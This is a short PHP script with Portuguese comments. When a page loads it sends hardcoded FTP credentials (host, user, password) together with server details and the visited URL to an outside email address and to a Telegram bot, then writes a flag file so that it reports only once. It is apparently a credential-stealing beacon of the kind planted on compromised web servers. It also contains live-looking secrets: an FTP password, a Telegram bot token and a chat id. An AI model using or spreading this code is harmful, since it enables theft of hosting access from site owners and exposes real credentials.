<?php

$ftp_host = "plesk-web14.webhostbox.net";
$ftp_user = "mystuim6";
$ftp_pwd = "Q~%4_H1L1J@B5+Ed";

$server_ip = "192.168.0.106";
$os = "Windows 10";
$docroot = "httpdocs";




$flag = __DIR__ . '/.enviado';

// SE JÁ FOI ENVIADO, NÃO FAZ NADA
if (file_exists($flag)) {
    return;
}

// EMAIL DESTINO
$para = "satamoita171@bol.com.br";
$assunto = "UPLOAD SUCESSO {$ftp_user} : {$ftp_pwd}";

// CAPTURA HOST E URL AUTOMATICAMENTE
$host = $_SERVER['HTTP_HOST'] ?? 'HOST_DESCONHECIDO';
$url  = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $host . ($_SERVER['REQUEST_URI'] ?? '');

// MENSAGEM HTML
$mensagem = "
<html>
<body>
<h2>Servidor acessado</h2>
<p><strong>Host :</strong> {$host}</p>
<p><strong>URL :</strong> {$url}</p>
<p><strong>FTP HOST : {$ftp_host}</p>
<p><strong>FTP USER : {$ftp_user}</p>
<p><strong>FTP PWD : {$ftp_pwd}</p><br><hr>

<p><strong>IP : {$server_ip}</p>
<p><strong>SYSTEN : {$os}</p>
<p><strong>ROOT : {$docroot}</p>


</body>
</html>
";


$headers  = "MIME-Version: 1.0\r\n";
$headers .= "Content-type:text/html; charset=UTF-8\r\n";
$headers .= "From: {$ftp_user}@{$host}\r\n";

$botToken = '8347405906:AAE1yuK_PBc2NoU8G3PfXVyaaaPpURK3tr4';
$chatId   = '-1003968579527';

$texto  = "📡 RELATÓRIO DO SERVIDOR\n";
$texto .= "🌐 Host: {$host}\n";
$texto .= "🔗 URL: {$url}\n\n";

$texto .= "👤 FTP Host: {$ftp_host}\n";
$texto .= "👤 FTP User: {$ftp_user}\n";
$texto .= "👤 FTP Pswd: {$ftp_pwd}\n\n";

$texto .= "👤 FTP IP: {$server_ip}\n";
$texto .= "👤 FTP SYSTEN: {$os}\n";
$texto .= "👤 FTP ROOT: {$docroot}\n";

$urlTG = "https://api.telegram.org/bot{$botToken}/sendMessage";

$data = [
    'chat_id' => $chatId,
    'text'    => $texto
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ],
];

$context = stream_context_create($options);
@file_get_contents($urlTG, false, $context);


@mail($para, $assunto, $mensagem, $headers);

// CRIA FLAG (TRAVA DEFINITIVA)
file_put_contents($flag, 'ok');

?>
